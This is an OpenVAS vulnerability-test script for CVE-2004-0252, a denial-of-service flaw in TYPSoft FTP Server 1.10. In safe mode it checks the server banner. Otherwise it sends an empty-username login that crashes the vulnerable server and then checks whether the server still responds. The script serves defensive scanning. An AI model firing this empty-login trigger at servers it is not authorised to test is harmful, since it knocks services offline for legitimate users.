# OpenVAS Vulnerability Test
# $Id: typsoftftp_empty_username_dos.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: TYPSoft empty username DoS
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote host seems to be running TYPSoft FTP server, version 1.10.

This version is prone to a remote denial of service flaw.
By sending an empty login username, an attacker can cause the ftp server 
to crash, denying service to legitimate users.";

tag_solution = "Use a different FTP server or upgrade to the newest version.";

# Ref: "intuit bug_hunter" <intuit@linuxmail.org>

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.14707");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2004-0252");
 script_bugtraq_id(9573);
 script_xref(name:"OSVDB", value:"6613");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

 script_name("TYPSoft empty username DoS");
 
 script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_banner");
 
 
 script_copyright("This script is Copyright (C) 2004 David Maciejak");
 script_family("FTP");
 script_dependencies("find_service_3digits.nasl");
 script_require_ports("Services/ftp", 21);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#
# The script code starts here
#

include("ftp_func.inc");

login = "";
pass  = get_kb_item("ftp/password");
port = get_kb_item("Services/ftp");

if(!port)port = 21;
if (! get_port_state(port)) exit(0);

if(safe_checks())
{
  banner = get_ftp_banner(port:port);
  if( ! banner ) exit(0);
  if(egrep(pattern:".*TYPSoft FTP Server (1\.10[^0-9])", string:banner) ) security_message(port);
  exit(0);
}
else
{
 soc = open_sock_tcp(port);
 if ( ! soc ) exit(0);
 if(ftp_authenticate(socket:soc, user:login, pass:pass))
 {
 	sleep(1);
 	#ftp_close(socket: soc);
	soc2 = open_sock_tcp(port);
	if ( ! soc2 || ! recv_line(socket:soc2, length:4096)) security_message(port);
	else close(soc2);
	close(soc);
 }
}
exit(0);
